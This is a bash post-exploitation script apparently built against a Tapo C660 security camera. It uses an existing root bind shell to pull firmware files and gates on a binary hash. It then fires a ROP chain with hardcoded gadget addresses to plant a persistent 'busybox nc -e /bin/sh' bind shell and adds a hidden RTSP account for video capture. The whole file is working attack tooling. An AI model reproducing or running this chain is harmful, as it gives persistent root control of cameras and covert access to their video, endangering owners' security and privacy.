#!/bin/bash
# Post-shell chain for the C660: convert the one-shot :4444 root shell into the FSS endstate.
#
# The chain is not derived on the unit. /bin/main came out of the BCL1 app initramfs offline
# (docs/exploit/tapo-c660-gadgets.md §3/§8), so the four numbers are constants here and the gate is
# the *binary identity*: the pulled /bin/main must hash to the decoded one, or the addresses belong
# to a build the unit does not run and nothing is fired.
#
# The bind shell is one-shot by construction, so the order is fixed and every step is bounded:
#
#   1. recon + pull the artifacts only a root shell can give (/proc/mtd, /bin/main, libc) first
#   2. gate on sha256(/bin/main) == the decoded image's binary; a mismatch stops with both hashes
#   3. install the repeatable ROP shell with the offline chain (no re-derivation on the unit)
#   4. provision the RTSP third account, soft-reset, then *verify* 554 with an authenticated
#      DESCRIBE — config acceptance is not a listener
#
# The C660 needs the per-session host route (§1) before any connect works; it is added here.
#
#   c660_postshell.sh <host> [--skip-rtsp]
#
# Artifacts: /tmp/pane1/<host>/ (recon.txt, bin_main, proc_mtd, rtsp_cred.txt, chain.log)
# Exit: 0 endstate reached, 2 an artifact step failed, 3 no shell, 4 /bin/main is a different
#       build (re-derive first), 5 ROP shell did not come back, 6 RTSP not serving.
set -u
HOST=${1:?host}
SKIP_RTSP=0
[ "${2:-}" = "--skip-rtsp" ] && SKIP_RTSP=1

HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="${OUTDIR:-/tmp/pane1/$HOST}"
SHELL_PORT="${SHELL_PORT:-4444}"
WAIT="${WAIT:-120}"
POST_TOOL="${POST_TOOL:-$HERE/tapo_post.py}"
ROP_TOOL="${ROP_TOOL:-$HERE/tapo_connectap_rop.py}"
ROUTE_CMD="${ROUTE_CMD:-sudo -n route add -host}"
PY="${PY:-python3}"

# The decoded build (c660_fw.bin.dec → BCL1 block 5 → cpio → /bin/main, 4 575 320 bytes) and the
# chain find_chain derives from it. Both are pinned by tests/c660_postshell_test.py.
WANT_HASH="${WANT_HASH:-bf72d72a0e120614c15c3ca99de0b9b4ec40571c9a02b1b37f805dae06bcd217}"
OFFSET=0x424
POP=0x24462
PIVOT=0x28514e
SYSTEM=0x15928

mkdir -p "$OUT"
LOG="$OUT/chain.log"

log() { printf '%s %s\n' "$(date '+%H:%M:%S')" "$*" | tee -a "$LOG"; }
die() { log "STOP: $*"; exit "${2:-2}"; }

shell_up() { nc -z -G 2 "$HOST" "$SHELL_PORT" >/dev/null 2>&1; }
wait_shell() {
  local end=$(( $(date +%s) + $1 )) i=0
  while [ "$(date +%s)" -lt "$end" ]; do
    shell_up && return 0
    i=$(( i + 1 )); [ $(( i % 10 )) -eq 0 ] && log "waiting for :$SHELL_PORT ($(( end - $(date +%s) ))s)"
    sleep 1
  done
  return 1
}
sha() { shasum -a 256 "$1" | cut -d' ' -f1; }

# The en0 link route returns EHOSTUNREACH for LAN hosts on this subnet (§1). Idempotent: an
# existing host route makes `route add` fail with "File exists", which is not an error here.
log "ensuring the host route to $HOST"
$ROUTE_CMD "$HOST" 192.168.4.1 >/dev/null 2>&1 || true

wait_shell "$WAIT" || die "no shell on $HOST:$SHELL_PORT within ${WAIT}s" 3
log "shell present — recon + pull"

# --- 1. recon and pulls ----------------------------------------------------------------------
"$POST_TOOL" "$HOST" --pull --port "${PORT:-5555}" 2>&1 | tee -a "$LOG"
[ -s "$OUT/proc_mtd" ] || die "/proc/mtd pull is empty" 2
[ -s "$OUT/bin_main" ] || die "/bin/main pull is empty" 2
log "pulled $(wc -c < "$OUT/proc_mtd") B of mtd map and $(wc -c < "$OUT/bin_main") B of /bin/main"

# --- 2. the gate: same build as the decoded image --------------------------------------------
GOT_HASH=$(sha "$OUT/bin_main")
log "sha256(/bin/main) = $GOT_HASH"
log "decoded image     = $WANT_HASH"
[ "$GOT_HASH" = "$WANT_HASH" ] \
  || die "the unit runs a different /bin/main — re-derive the chain (find_chain.py) before firing" 4
log "binary identity matches — the offline chain applies"

# --- 3. repeatable ROP shell -----------------------------------------------------------------
"$ROP_TOOL" "$HOST" --offset "$OFFSET" --pop "$POP" --pivot "$PIVOT" --system "$SYSTEM" \
  --cmd "/bin/busybox nc -lk -p 4444 -e /bin/sh &" 2>&1 | tee -a "$LOG"
sleep 2
wait_shell "$WAIT" || die "the ROP shell never came back — repeat the ROP by hand" 5
log "repeatable root shell up"

[ "$SKIP_RTSP" = 1 ] && { log "RTSP skipped (--skip-rtsp)"; exit 0; }

# --- 4. RTSP provisioning (the FSS ingest account) -------------------------------------------
PASS=$(python3 -c 'import secrets; print(secrets.token_urlsafe(12))')
umask 077
printf '%s %s\n' fssuser "$PASS" > "$OUT/rtsp_cred.txt"
umask 022
"$POST_TOOL" "$HOST" --rtsp-enable --rtsp-user fssuser --rtsp-pass "$PASS" \
  --rtsp-reset 2>&1 | tee -a "$LOG" || die "RTSP provisioning was not accepted" 6
log "config accepted; soft reset sent — waiting for the unit to return"
"$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
  --wait "${RTSP_WAIT:-10}" 2>&1 | tee -a "$LOG" || die "554 does not serve with the account" 6

log "ENDSTATE reached — account in $OUT/rtsp_cred.txt"
log "next: deliverables/scripts/e2e_capture_rtsp.sh $HOST fssuser '<pass>'"
exit 0
